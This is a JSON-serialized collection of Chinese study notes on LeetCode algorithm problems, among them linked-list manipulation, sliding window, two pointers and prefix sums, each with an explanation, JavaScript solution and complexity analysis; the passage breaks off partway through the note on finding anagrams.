目录\n<!-- toc -->\n ## 题目及理解 \n\n![image.png|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/4d1151bf396c03af984ebd8f5e3bcad9.png)\n\n## 解题思路\n\n> 其实就是 [移除元素](https://www.yuque.com/liguwe/agorithms/wftg17qn12ytlsrc) （指定移动哪个元素） 的特殊版本，这里指定移动` 0 `\n\n- 双指针：`slow` 和 `fast`\n- `slow` 之后的值换成 `0` 即可\n\n## 代码实现\n\n```javascript\n/**\n * @param {number[]} nums\n * @return {void} Do not return anything, modify nums in-place instead.\n */\nvar moveZeroes = function (nums) {\n  let slow = 0;\n  let fast = 0;\n  while (fast < nums.length) {\n    if (nums[fast] !== 0) {\n      nums[slow] = nums[fast];\n      slow++;\n    }\n    fast++;\n  }\n  for (let i = slow; i < nums.length; i++) {\n    nums[i] = 0;\n  }\n  return nums;\n};\n\n```\n\n## 错误记录\n\n","FRdsrtrv":"\n# 删除链表的中间节点\n\n\n`#双指针` `#链表` `#快慢指针` `#2024/07/30` \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目及理解 \n\n![image.png600|576](https://832-1310531898.cos.ap-beijing.myqcloud.com/202407300745016.png?imageSlim)\n\n> 注意上面的标注的意思\n## 2. 解题思路\n\n1. **base case 特殊情况处理**：\n    - 如果链表为空或只有一个节点，我们直接返回 null。\n2. **使用快慢指针**：\n    - 初始化三个指针：`slow`、`fast` 和 `prev`。\n        - `slow` 和 `fast` 都从 `head` 开始。\n        - `prev` 用来跟踪 `slow` 的前一个节点\n3. **移动指针**：\n    - 在每次循环中，`fast` 移动`两步`，`slow` 移动`一步`。\n    - 当循环结束时，`slow` 将指向中间节点。\n4. **删除中间节点**：\n    - 循环结束后，`prev` 指向中间节点的前一个节点。\n    - 我们通过设置 `prev.next = slow.next` 来删除中间节点。\n5. **返回结果**：\n    - 返回修改后的链表头部 `head`。\n\n## 3. 代码实现\n\n```javascript\n/**\n * Definition for singly-linked list.\n * function ListNode(val, next) {\n *     this.val = (val===undefined ? 0 : val)\n *     this.next = (next===undefined ? null : next)\n * }\n */\n/**\n * @param {ListNode} head\n * @return {ListNode}\n */\nvar deleteMiddle = function (head) {\n  // 1. **base case 特殊情况处理**：\n  //     - 如果链表为空或只有一个节点，我们直接返回 null。\n  if (head === null || head.next === null) {\n    return null;\n  }\n\n  // 2. **使用快慢指针**：\n  //     - 初始化三个指针：`slow`、`fast` 和 `prev`。\n  //         - `slow` 和 `fast` 都从 `head` 开始。\n  //         - `prev` 用来跟踪 `slow` 的前一个节点\n  let slow = head;\n  let fast = head;\n  let prev = null;\n\n  // 3. **移动指针**：\n  //     - 在每次循环中，`fast` 移动`两步`，`slow` 移动`一步`。\n  //     - 当循环结束时，`slow` 将指向中间节点。\n\n  while (fast !== null && fast.next !== null) {\n    // 快指针移动两步\n    fast = fast.next.next;\n    // 先记录slow的位置，使用prev指针\n    prev = slow;\n    // 慢指针移动一步\n    slow = slow.next;\n  }\n\n  // 4. **删除中间节点**：\n  //     - 循环结束后，`prev` 指向中间节点的前一个节点。\n  //     - 我们通过设置 `prev.next = slow.next` 来删除中间节点。\n\n  prev.next = slow.next; // 删除中间节点\n\n  // 5. **返回结果**：\n  //     - 返回修改后的链表头部 `head`。\n\n  return head;\n};\n\n```\n\n### 3.1. 复杂度分析\n\n- 时间复杂度是 `O(n)`，其中 `n` 是链表的长度。我们只需要遍历链表一次。\n- 空间复杂度是 `O(1)`，因为我们只使用了固定数量的额外空间（几个指针）。\n\n## 4. 错误记录","OQ6LDFpT":"\n# 无重复字符的最长子串\n\n\n`#leetcode`   `#2024/08/05`  `#算法/滑动窗口`  \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![image.png600|536](https://832-1310531898.cos.ap-beijing.myqcloud.com/202408050719710.png?imageSlim)\n\n> [!danger]\n>  返回的是最长子串的**长度**，而不是最长无重复子串本身\n\n## 解题思路\n\n**滑动窗口框架**\n\n```javascript hl:25\n// 滑动窗口算法伪码框架\nvar slidingWindow = function(s) {\n    // 用合适的数据结构记录窗口中的数据，根据具体场景变通\n    // 比如说，我想记录窗口中元素出现的次数，就用 map\n    // 如果我想记录窗口中的元素和，就可以只用一个 int\n    var window = ...;\n\n    // 左右指针，用于移动窗口\n    var left = 0\n    let right = 0;\n    while (right < s.length) {\n        // c 是将移入窗口的字符\n        var c = s[right];\n        window.add(c);\n        // 增大窗口\n        right++;\n        // 进行窗口内数据的一系列更新\n        // ...\n        // *** debug 输出的位置 ***\n        // 注意在最终的解法代码中不要 print\n        // 因为 IO 操作很耗时，可能导致超时\n        console.log(left, right);\n        // *********************\n\n        // 判断左侧窗口是否要收缩\n        while (window needs shrink) {\n            // d 是将移出窗口的字符\n            var d = s[left];\n            window.remove(d);\n            // 缩小窗口\n            left++;\n            // 进行窗口内数据的一系列更新\n            ...\n        }\n    }\n};\n\n```\n\n## 代码实现\n\n```javascript\n/**\n * @param {string} s\n * @return {number}\n */\nvar lengthOfLongestSubstring = function (s) {\n  let left = 0;\n  let right = 0;\n  // 最长子串的长度\n  let res = 0;\n\n  // 滑动窗口, 用来记录窗口中的字符出现的次数，key为字符，value为字符出现的次数\n  // 当字符出现的次数大于1时，说明重复了，需要收缩窗口，即 left++\n  // 当字符出现的次数等于1时，说明没有重复，可以扩大窗口，即 right++\n  let win = new Map();\n\n  while (right < s.length) {\n    let c = s[right];\n    right++;\n    // 进行窗口内数据的一系列更新, 例如增加字符的次数\n    win.set(c, (win.get(c) || 0) + 1);\n\n    // 判断左侧窗口是否需要收缩\n    // 当字符的数量大于1时, 说明重复了, 需要收缩\n    while (win.get(c) > 1) {\n      let d = s[left];\n      left++;\n      // 进行窗口内数据的一系列更新, 例如减少字符的次数\n      win.set(d, win.get(d) - 1);\n    }\n    // 在这里更新答案\n    res = Math.max(res, right - left);\n  }\n\n  return res;\n};\n\n```\n\n### 复杂度分析\n\n- 时间复杂度：`O(n)`\n\t- 其中 `n` 是字符串的长度\n\t- 在最坏的情况下，左右指针各遍历整个字符串一次。\n-  空间复杂度：`O(min(m, n))`\n\t- 其中 `m` 是**字符集的大小**\n\t- `n` 是字符串的长度\n\n","tQ2o63sj":"\n# 奇偶链表\n\n\n`#单链表`  `#2024/07/30`  `#单链表/双指针` `#单链表/快慢指针`  \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目及理解 \n\n![image.png600|744](https://832-1310531898.cos.ap-beijing.myqcloud.com/202407300802267.png?imageSlim)\n\n## 2. 解题思路\n\n1. 处理特殊情况：base case\n    - 如果`链表为空`或`只有一个节点`，直接返回原链表。\n2. 初始化指针：三个变量\n    - odd：指向奇数索引节点，初始为 head\n    - even：指向偶数索引节点，初始为 head.next\n    - evenHead：保存偶数链表的头节点，用于最后的连接\n3. 遍历链表，分离奇偶节点\n    - 奇数节点连接到奇数链表\n    - 偶数节点连接到偶数链表\n4. 连接奇偶链表\n    - 将`奇数链表的尾部`与`偶数链表的头部`相连\n5. 返回重组后的链表头\n\n## 3. 代码实现\n\n```javascript\n/**  \n * @description 解题思路步骤：  \n * 1. 处理特殊情况：base case  \n *     - 如果`链表为空`或`只有一个节点`，直接返回原链表。  \n * 2. 初始化指针：三个变量  \n *     - odd：指向奇数索引节点，初始为 head  \n *     - even：指向偶数索引节点，初始为 head.next  \n *     - evenHead：保存偶数链表的头节点，用于最后的连接  \n * 3. 遍历链表，分离奇偶节点  \n *     - 奇数节点连接到奇数链表  \n *     - 偶数节点连接到偶数链表  \n * 4. 连接奇偶链表  \n *     - 将`奇数链表的尾部`与`偶数链表的头部`相连  \n * 5. 返回重组后的链表头  \n * */  \n  \n/**  \n * Definition for singly-linked list. * function ListNode(val, next) {  \n *     this.val = (val===undefined ? 0 : val)  \n *     this.next = (next===undefined ? null : next) * }  \n */  \n/**  \n * @param {ListNode} head  \n * @return {ListNode}  \n */  \nvar oddEvenList = function (head) {  \n    // ① 处理特殊情况：base case  \n    if (head === null || head.next === null) {  \n        return head;  \n    }  \n    // ② 初始化指针：三个变量  \n    let odd = head; // 奇数链表的头节点  \n    let even = head.next; // 偶数链表的头节点  \n    let evenHead = even;  // 保存偶数链表的头节点，用于最后的连接  \n  \n    // ③ 遍历链表，分离奇偶节点  \n    while (even !== null && even.next !== null) {  \n        // 奇数节点连接到奇数链表  \n        // 奇数节点的下一个节点 指向 偶数节点的下一个节点（自然是下一个技术节点了）  \n        odd.next = even.next; \n        odd = odd.next;       // 奇数节点指针后移  \n        // 偶数节点连接到偶数链表  \n        // 偶数节点的下一个节点 指向 奇数节点的下一个节点（自然是下一个偶数节点了）  \n        even.next = odd.next;  \n        even = even.next;      // 偶数节点指针后移  \n    }  \n    // ④ 连接奇偶链表  \n    odd.next = evenHead; // 将奇数链表的尾部与偶数链表的头部相连  \n    // ⑤ 返回重组后的链表头  \n    return head;  \n};\n```\n\n### 3.1. 复杂度分析\n\n- 时间复杂度：`O(n)`，其中 `n` 是链表的长度，我们只遍历了一次链表。 \n- 空间复杂度：`O(1)`，我们只使用了`常数级`的额外空间\n\n## 4. 错误记录","S3oB6ZeG":"\n# 递增的三元子序列\n\n\n`#leetcode` `#2024/07/28`  `#算法` \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![image.png|640](https://832-1310531898.cos.ap-beijing.myqcloud.com/13c6ebae35cee42b11c377759cf0b779.png)\n\n## 解题思路\n\n- 两个变量：`第一最大值` 和 `第二最大值`\n- 遍历，根据当前遍历的元素\n   - 更新第一最大值\n   - 更新第二最大值，他一定小于第一最大值\n   - 否则：小于第一最大值，也许与第二最大值\n      - 那么 当前值、第二最大值、第一最大值不就满足题设了吗？\n\n## 代码实现\n\n```javascript\n/**\n * @param {number[]} nums\n * @return {boolean}\n */\nvar increasingTriplet = function (nums) {\n  // base case\n  if (nums.length < 3) {\n    return false;\n  }\n\n  // 先定义两个最大值\n  // first 为第一个最大值\n  let first = Number.MAX_SAFE_INTEGER;\n  // second 为第二个最大值\n  let second = Number.MAX_SAFE_INTEGER;\n\n  // 遍历数组\n  for (let i = 0; i < nums.length; i++) {\n    // ① 当当前元素小于第一个最大值时，确保 first 是遍历到当前元素之前的最小值\n    if (nums[i] <= first) {\n      // 更新第一个最大值\n      first = nums[i];\n      //②  用于更新第二小值 second，确保 second 是遍历到当前元素之前的第二小值，并且大于 first。\n    } else if (nums[i] <= second) {\n      // 当当前元素小于第二个最大值时\n      // 更新第二个最大值\n      second = nums[i];\n      //③ 否则， 当 num 大于 second 时，说明找到了一个递增的三元组，返回 true\n    } else {\n      // 当当前元素大于第二个最大值时\n      // 返回 true\n      return true;\n    }\n  }\n\n  return false;\n};\n\n```\n\n### 注意📢\n\n>  如果手写不出来` Number.MAX_SAFE_INTEGER` 可以参考下面写法\n\n```javascript\nconst first =  Number.MAX_SAFE_INTEGER; \nconst first = Math.min() // 返回无穷大 Infinity \n\n\n// 先定义两个最大值\nlet first = 2**31 -1;\nlet second = 2**31 -1;\n```\n\n>  `const  first =  Number.MAX_SAFE_INTEGER;` \n>  `const first =  2^31 -1 ;`\n\n### 复杂度分析\n\n## 错误记录\n\n","aXuq2toQ":"\n# 反转字符串中的元音字母\n\n`#2024/07/28` `#leetcode`  `#算法/双指针`  \n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![image.png|536](https://832-1310531898.cos.ap-beijing.myqcloud.com/e0cc283efc425dcc42f1db528e1cf695.png)\n\n## 解题思路\n\n![image.png|544](https://832-1310531898.cos.ap-beijing.myqcloud.com/c3bf82b3e851ebcc70cdaeda2ff02021.png)\n\n## 代码实现\n\n```javascript\n/**\n * @param {string} s\n * @return {string}\n */\nvar reverseVowels = function (s) {\n  // 元音字母\n  const vowels = \"aeiouAEIOU\";\n  // 将字符串转换为数组\n  const arr = s.split(\"\");\n  // 左指针\n  let left = 0;\n  // 右指针\n  let right = arr.length - 1;\n  // 当左指针小于右指针时，执行循环\n  while (left < right) {\n    // 当左指针对应的字符不是元音字母时，左指针右移\n    while (left < right && vowels.indexOf(arr[left]) === -1) {\n      left++;\n    }\n    // 当右指针对应的字符不是元音字母时，右指针左移\n    while (left < right && vowels.indexOf(arr[right]) === -1) {\n      right--;\n    }\n    // 这时，左指针对应的字符是元音字母，右指针对应的字符也是元音字母\n    // 交换左右指针对应的字符\n    [arr[left], arr[right]] = [arr[right], arr[left]];\n    // 左指针右移\n    left++;\n    // 右指针左移\n    right--;\n  }\n  return arr.join(\"\");\n};\n\n```\n\n## 错误记录\n\n![image.png](https://832-1310531898.cos.ap-beijing.myqcloud.com/10e8be78b37b1a4031f14dae7dcab7e5.png)\n\n","BtRBsp1A":"\n# 判断子序列\n\n\n`#2024/07/28` `#算法/双指针`  `#leetcode` \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![image.png|560](https://832-1310531898.cos.ap-beijing.myqcloud.com/100200a42cdfb5c4b386f9fa25baf3b1.png)\n\n## 解题思路\n\n![640.gif](https://832-1310531898.cos.ap-beijing.myqcloud.com/fd27ca36abe5b0ffbc24048d5e39f11e.gif)\n\n- 使用`快慢指针`遍历\n- 遍历完后看`慢指针是否等于子序列的长度`\n\n## 代码实现\n\n```javascript\n/**\n * @param {string} s\n * @param {string} t\n * @return {boolean}\n */\nvar isSubsequence = function (s, t) {\n  let slow = 0; // 慢指针\n  let fast = 0; // 快指针\n\n  // 使用快慢指针，遍历字符串 t\n  while (fast < t.length) {\n    // 当 s[slow] 与 t[fast] 相等时，慢指针向后移动一位\n    if (s[slow] === t[fast]) {\n      slow++;\n    }\n    // 快指针向后移动一位，正常速度移动\n    fast++;\n  }\n  // 如果慢指针的值等于 s 的长度，说明 s 是 t 的子序列\n  return slow === s.length;\n};\n\n```\n\n### 复杂度分析\n\n## 进阶\n\n比较困难，详细题解：[二分查找高效判定子序列](https://labuladong.online/algo/frequency-interview/binary-search-subsequence/)\n\n## 错误记录\n\n","cEScrVAg":"\n# 字符串解码\n\n\n`#2024/07/28` `#算法/栈` \n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![image.png600](https://832-1310531898.cos.ap-beijing.myqcloud.com/202407280730257.png?imageSlim)\n\n## 解题思路\n\n**栈结构**可以很好地处理嵌套问题\n1. **使用两个栈**：\n    - 一个栈存储重复次数（数字部分）。\n    - 另一个栈存储字符串（字符部分）。\n2. **遍历字符串**：\n    - ① 遇到`数字`时，将完整的数字提取出来。\n    - ② 遇到 `[` 时，表示接下来会是一个新的子字符串，准备入栈。\n    - ③ 遇到 `]` 时，表示当前子字符串结束，需要出栈并进行处理重复。\n    - ④ 遇到`普通字符`时，直接累加到当前的字符串段中。\n\n## 代码实现\n\n```javascript\n/**\n * @param {string} s\n * @return {string}\n */\nvar decodeString = function (s) {\n  // ① 使用两个栈，分别存储倍数和字符串\n  let countStack = [];\n  let strStack = [];\n  // 代表当前的字符串\n  let currentStr = \"\";\n  //代表出现的次数\n  let k = 0;\n  // 遍历字符串\n  for (let i = 0; i < s.length; i++) {\n    // ①\n    // 如果是数字，可能是多位数，比如 \"12[abc]\"，所有处理两次遍历到的数字，计算出真正的数字\n    // 例如：第一次遍历到的是1，第二次遍历到的是2，那么真正的数字就是 1 * 10 + 2 = 12\n    if (!isNaN(s[i])) {\n      k = k * 10 + parseInt(s[i]);\n    }\n    // ② 如果是左括号\n    else if (s[i] === \"[\") {\n      // 将出现的次数入栈\n      countStack.push(k);\n      // 字符串入栈\n      strStack.push(currentStr);\n      // 重置出现次数和字符串\n      k = 0;\n      currentStr = \"\";\n    }\n    // ③ 如果是右括号\n    else if (s[i] === \"]\") {\n      // 出栈\n      let count = countStack.pop();\n      // 出栈\n      let str = strStack.pop();\n      // 拼接字符串\n      currentStr = str + currentStr.repeat(count);\n    }\n    // ④ 如果是字母，即普通字符，更新当前字符串，用于后面拼接逻辑\n    else {\n      // 拼接字符串, 例如 \"abc\"，\"abc\" 就是一个字符串\n      // 例如 \"12[abc]\"，\"abc\" 就是一个字符串\n      currentStr += s[i];\n    }\n  }\n  return currentStr;\n};\n\n```\n\n### 复杂度分析\n\n- **时间复杂度**：\n    - 遍历字符串的次数为 `O(n)`，每个字符在栈中操作的时间为 `O(1)`，所以总时间复杂度为 `O(n)`。\n- **空间复杂度**：\n    - 空间复杂度主要由栈占用，最坏情况下需要 `O(n)` 的空间，因为所有字符和数字可能都需要入栈。\n\n## 错误记录","dahCkntI":"\n# 除法求值\n\n\n`#leetcode`   `#2024/09/14`  `#算法`  `#算法/图`  `#有向加权图` `#DFS` \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目及理解 \n\n![cos-blog-832-34-20241012|1064](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240914213736.png)\n\n## 2. 思路：使用 DFS\n\n1. **图的构建（buildGraph 函数）**:\n    - 将方程式转换为一个加权有向图。\n    - 每个变量是图中的一个节点。\n    - 每个方程 a/b = val 在图中表示为两条边：a->b（权重为val）和b->a（权重为1/val）。\n    - 使用**邻接表**来表示这个图。\n    - ![cos-blog-832-34-20241012|456](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240914220018.png)\n2. **主函数（calcEquation）**:\n    - 首先调用 buildGraph 构建图。\n    - 对每个查询 (a, b)：\n        - 如果 a 或 b 不在图中，返回 -1。\n        - 否则，调用 dfs 函数来计算结果。\n3. **深度优先搜索（dfs 函数）**:\n    - 用于计算两个节点之间的路径值（即除法结果）。\n    - 基本情况\n        - 如果 a === b，返回 1。\n    - 使用 visited 集合避免循环。\n    - 递归探索 a 的所有邻居节点。\n    - 如果找到通向 b 的路径，返回路径上边权重的乘积。\n    - 如果没有找到路径，返回 -1。\n\n流程图如下：\n\n![cos-blog-832-34-20241012|250](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Algorithm%20Flowchart.svg)\n\n## 3. 代码实现\n\n```javascript\n/**\n * @param {string[][]} equations\n * @param {number[]} values\n * @param {string[][]} queries\n * @return {number[]}\n */\nvar calcEquation = function (equations, values, queries) {\n  const graph = buildGraph(equations, values);\n\n  const res = [];\n\n  for (const [a, b] of queries) {\n    // 如果 a 或 b 不存在，则 a / b 不存在,返回 -1\n    if (!graph[a] || !graph[b]) {\n      res.push(-1);\n    } else {\n      // 否则，使用深度遍历计算 a / b 的值\n      res.push(dfs(a, b, graph, new Set()));\n    }\n  }\n\n  return res;\n};\n\n/**\n * @description 构建图\n * @param {string[][]} equations, 二维数组，每个元素是一个长度为 2 的数组，表示方程式的两个变量\n * @param {number[]} values, 数组，表示方程式的结果\n * @return {object} 图，使用邻接表表示\n */\nfunction buildGraph(equations, values) {\n  const graph = {};\n  for (let i = 0; i < equations.length; i++) {\n    const [a, b] = equations[i];\n    const val = values[i];\n\n    // a -> b\n    // a / b = val\n    // b / a = 1 / val\n    if (!graph[a]) {\n      graph[a] = [];\n    }\n    // a -> b, val 代表 a/b\n    graph[a].push({ node: b, val });\n\n    // b -> a\n    if (!graph[b]) {\n      graph[b] = [];\n    }\n    // b -> a, 1/val 代表 b/a\n    graph[b].push({ node: a, val: 1 / val });\n  }\n  return graph;\n}\n\n/**\n * @description 使用深度遍历 计算 a / b 的值，如果 a / b 不存在，则返回 -1\n * @param {string} a\n * @param {string} b\n * @param {object} graph\n * @param {Set} visited\n * @return {number}\n */\nfunction dfs(a, b, graph, visited) {\n  // 如果 a === b，则 a / b = 1\n  if (a === b) {\n    return 1;\n  }\n\n  visited.add(a);\n\n  for (const { node, val } of graph[a]) {\n    if (visited.has(node)) {\n      continue;\n    }\n\n    const res = dfs(node, b, graph, visited);\n    if (res !== -1) {\n      return val * res;\n    }\n  }\n\n  return -1;\n}\n\n```\n\n","UbKkHvHx":"\n# 缺失的第一个正数\n\n\n`#leetcode`   `#2024/08/25`  `#算法` \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\nhttps://leetcode.cn/problems/first-missing-positive/\n\n\n![cos-blog-832-34-20241012|984](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240825101102.png)\n\n## 思路一\n\n1. **范围分析**：\n\t- 最小的缺失正整数一定在 `[1, n+1]` 之间，其中 `n` 是数组的长度。\n\t- 如果数组包含了从 1 到 n 的所有数，那么缺失的正整数就是 `n+1`。\n2. **原地修改数组**：把每个**已经存在的数**变成它的负数\n3. **查找缺失的数**：\n\t- 在重新排列数组后，遍历数组\n\t- 找到第一个位置 `i` 使得 `nums[i] != i + 1`，则 `i + 1` 就是缺失的最小正整数。\n\n### 举个例子\n\n- 初始数组：`[3, 4, -1, 1]` 数组长度 `n = 4`\n- 预处理（将不在 `[1, n]` 范围内的数替换为 `n+1`：\n    - `-1` 被替换为 `5` (n+1) 结果：`[3, 4, 5, 1]`\n- 原地修改数组：把每个**已经存在的数**变成它的负数\n\t- 已经存在的数：即 `<= n = 4` 的数\n\t- 其他的数不变\n- 找到大于 0 的数，返回它的`索引+1`\n\n## 代码实现\n\n```javascript\n/**  \n * @param {number[]} nums  \n * @return {number}  \n */  \nvar firstMissingPositive = function (nums) {  \n    const n = nums.length;  \n    // Step 1: 将所有小于等于0或大于n的数替换为n+1  \n    for (let i = 0; i < n; i++) {  \n        if (nums[i] <= 0 || nums[i] > n) {  \n            nums[i] = n + 1;  \n        }  \n    }  \n    // Step 2: 使用原地哈希，将每个数放到对应的位置  \n    // ::::放他的负数，表示这个数出现过，如果大于 0 说明没出现过 ::::    \n    for (let i = 0; i < n; i++) {  \n        let num = Math.abs(nums[i]);  \n        // 如果 num <= n，将 nums[num-1] 变为负数  \n        // 说明 num 出现过  \n        if (num <= n) {  \n            nums[num - 1] = -Math.abs(nums[num - 1]);  \n        }  \n        // 还是正数，说明 num 没出现过  \n    }  \n    // Step 3: 找到第一个正数，其索引 +1 就是缺失的最小正数  \n    for (let i = 0; i < n; i++) {  \n        if (nums[i] > 0) {  \n            return i + 1;  \n        }  \n    }  \n    // 如果没有找到，则返回n+1  \n    return n + 1;  \n};\n```\n\n## 复杂度分析\n\n时间复杂度分析：\n1. 第一个循环：O(n)\n    - 遍历整个数组一次，将不在 `[1, n]` 范围内的数替换为 n+1。\n2. 第二个循环：O(n)\n    - 再次遍历整个数组，进行原地哈希标记。\n3. 第三个循环：O(n)\n    - 最后一次遍历数组，寻找第一个正数。\n总时间复杂度：O(n) + O(n) + O(n) = `O(n)`\n\n空间复杂度分析：\n- 这个算法使用了原地修改的技巧，没有使用任何额外的数据结构。\n- 只使用了几个额外的变量（如 n, i, num），这些变量的空间是常数级的。\n总空间复杂度：`O(1)`\n\n复杂度分析总结：\n- 时间复杂度：O(n)\n- 空间复杂度：O(1)\n\n这个算法的优点在于：\n\n1. 时间效率高：只需线性时间就能解决问题。\n2. 空间效率高：通过原地修改数组，避免了使用额外空间。\n\n","coXn6ULb":"\n# 接雨水\n\n\n`#leetcode`   `#2024/07/31`  `#算法/双指针` `#算法/备忘录`   \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目及理解 \n\n![image.png600|600](https://832-1310531898.cos.ap-beijing.myqcloud.com/202407310906405.png?imageSlim)\n\n## 2. 解题思路\n\n🌧 最多能够装多少水  =  每个柱子上能够装多少水  = `每个柱子左边和右边最高柱子的最矮的那个 - 该柱子的高度` ，如下代码\n\n```python\nwater[i] = min(\n    # 左边最高的柱子\n    max(height[0..i]),  \n    # 右边最高的柱子\n    max(height[i..end]) \n) - height[i]\n```\n\n如下图：\n\n![image.png600|536](https://832-1310531898.cos.ap-beijing.myqcloud.com/202407310915725.png?imageSlim)\n\n## 3. 代码实现\n\n### 3.1. 解法一：暴力遍历\n\n按照上面的思路，直接==暴力遍历==即可，复杂度是 `O(N^2)`，空间复杂度 `O(1)`\n\n```javascript\nvar trap = function(height) {\n    var n = height.length;\n    var res = 0;\n    for (var i = 1; i < n - 1; i++) {\n        var l_max = 0, r_max = 0;\n        // 找右边最高的柱子\n        for (var j = i; j < n; j++)\n            r_max = Math.max(r_max, height[j]);\n        // 找左边最高的柱子\n        for (var j = i; j >= 0; j--)\n            l_max = Math.max(l_max, height[j]);\n        // 如果自己就是最高的话，\n        // l_max == r_max == height[i]\n        res += Math.min(l_max, r_max) - height[i];\n    }\n    return res;\n};\n```\n\n### 3.2. 解法二：备忘录优化\n\n对于解法一，可以使用备忘录优化：\n\n- 定义两个数组 `r_max` 和 `l_max` 充当备忘录，预先把这两个数组计算好，避免重复计算\n\t- `l_max[i]` 表示位置 `i` 左边最高的柱子高度\n\t- `r_max[i]` 表示位置 `i` 右边最高的柱子高度\n\n### 3.3. 解法三：双指针\n\n时间复杂度为 `O(n)`，空间复杂度为 `O(1)`\n\n```javascript\nwater[i] = min(\n    # 左边最高的柱子\n    max(height[0..i]),  \n    # 右边最高的柱子\n    max(height[i..end]) \n) - height[i]\n/**  \n * @param {number[]} height  \n * @return {number}  \n */  \nvar trap = function (height) {  \n  \n    // 双指针  \n    let left = 0;  \n    let right = height.length - 1;  \n  \n    // 当前遍历的元素的 左边的最大值  \n    let leftMax = 0;  \n    // 当前遍历的元素的 右边的最大值  \n    let rightMax = 0;  \n    // 结果  \n    let res = 0;  \n  \n    // 遍历, 双向遍历，从两边向中间靠拢  \n    while (left < right) {  \n        // 更新左边的最大值  \n        leftMax = Math.max(leftMax, height[left]);  \n        // 更新右边的最大值  \n        rightMax = Math.max(rightMax, height[right]);  \n  \n        // 说明最小值在左边，当前元素的水量 = 左边最大值 - 当前元素的高度  \n        if (leftMax < rightMax) {  \n            // 更新结果  \n            res += leftMax - height[left];  \n            // 左指针向右移动  \n            left++;  \n            // 说明最小值在右边，当前元素的水量 = 右边最大值 - 当前元素的高度  \n        } else {  \n            // 更新结果  \n            res += rightMax - height[right];  \n            // 右指针向左移动  \n            right--;  \n        }  \n    }  \n  \n    // 返回结果  \n    return res;  \n  \n};\n```\n\n","HvihJENr":"\n# 路径总和 III\n\n\n`#leetcode`   `#2024/08/17` `#算法/二叉树` `#算法/前缀和` \n\n\n## 目录\n<!-- toc -->\n ## 1. 题目及理解 \n\n![cos-blog-832-34-20241012](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240817143510.png)\n\n## 2. 解题思路\n\n- 二叉树的前序后序遍历\n- 前缀和技巧\n\n## 3. 代码实现\n\n```javascript\n/**\n * @param {TreeNode} root\n * @param {number} targetSum\n * @return {number}\n */\nvar pathSum = function(root, targetSum) {\n\n    // key 是前缀和，value 是前缀和为 pathSum 的个数\n    const preSumCount = new Map();\n    // 初始化，前缀和为 0 的路径有一条\n    // 为什么要初始化呢？\n    // 这个设置可以被理解为代表一个\"空路径\"，其和为 0\n    preSumCount.set(0, 1);\n    // pathSum 记录当前路径和，即从根节点到当前节点的路径和\n    let pathSum = 0;\n    // res 记录满足条件的路径条数\n    let res = 0;\n    const traverse = function(root) {\n        // 递归终止条件\n        // base case\n        if (root == null) {\n            return;\n        }\n        /*************************************************\n         * ::::::::::::::::::::: 前序遍历位置 ::::::::::::::::::\n         ************************************************/\n        // 前序遍历位置, 计算路径和\n        pathSum += root.val;\n\n        // 先看一下路径和为 pathSum - targetSum 的路径有多少条\n        // :::: pathSum - targetSum 代表的是从根节点到当前节点的路径和为 targetSum\n        // 即满足条件的路径，所以更新 res 的值\n        res += preSumCount.get(pathSum - targetSum) || 0;\n        // 记录从二叉树的根节点开始，路径和为 pathSum 的路径条数\n        preSumCount.set(pathSum, (preSumCount.get(pathSum) || 0) + 1);\n        traverse(root.left);\n        traverse(root.right);\n        /*************************************************\n         * ::::::::::::::: 后序遍历位置 ::::::::::::::\n         ************************************************/\n        preSumCount.set(pathSum, preSumCount.get(pathSum) - 1);\n        pathSum -= root.val;\n    }\n\n    traverse(root);\n    return res;\n};\n```\n\n## 4. 复杂度分析\n\n- 时间复杂度：O(N)，其中 N 是树中的节点数。\n- 空间复杂度：O(N)，主要由递归调用栈和 `preSumCount` Map 贡献。\n\n## 5. 错误记录\n\n初始化空路径的处理：`preSumCount.set(0, 1);`\n\n","laXCOpt4":"\n# 找到字符串中所有字母异位词\n\n\n`#leetcode`   `#2024/08/10`  `#算法/滑动窗口` \n\n\n## 目录\n<!-- toc -->\n ## 题目及理解 \n\n![cos-blog-832-34-20241012|624](https://blog-1310531898.cos.ap-beijing.myqcloud.com/832-34-20241012/Pasted%20image%2020240810142206.png)\n\n关于 异位词，再举几个例子\n1. \"listen\" 和 \"silent\" 是异位词。 它们包含相同的字母，每个字母出现的次数也相同。\n2. \"debit card\" 和 \"bad credit\" 是异位词。 忽略空格后，它们包含相同的字母集合，且每个字母的出现次数相同。\n3. \"aab\" 和 \"baa\" 是异位词。 注意这里 **'a' 重复出现了两次，'b' 出现了一次**，两个词中字母出现的次数是相同的。\n4. \"egg\" 和 \"geg\" 是异位词。 这里 'g' 重复出现。\n5. \"aaabbb\" 和 \"ababab\" 是异位词。 尽管排列不同，但 'a' 和 'b' 都各出现了三次。\n\n> [!danger]\n>  所以要遍历所以字母，看每个字母出现了几次\n>  \n## 解题思路\n\n### 思路一：滑动窗口\n\n```javascript\nint left = 0, right = 0;\n\nwhile (right < nums.size()) {\n    // 增大窗口\n    window.addLast(nums[right]);\n    right++;\n    \n    while (window needs shrink) {\n        // 缩小窗口\n        window.removeFirst(nums[left]);\n        left++;\n    }\n}\n```\n\n使用 JavaScript 语言描述\n\n```javascript\n\n// 滑动窗口算法伪码框架\nvar slidingWindow = function(s) {\n    // 用合适的数据结构记录窗口中的数据，根据具体场景变通\n    // 比如说，我想记录窗口中元素出现的次数，就用 map\n    // 如果我想记录窗口中的元素和，就可以只用一个 int\n    var window = ...;\n\n    var left = 0, right = 0;\n    while (right < s.length) {\n        // c 是将移入窗口的字符\n        var c = s[right];\n        window.add(c);\n        // 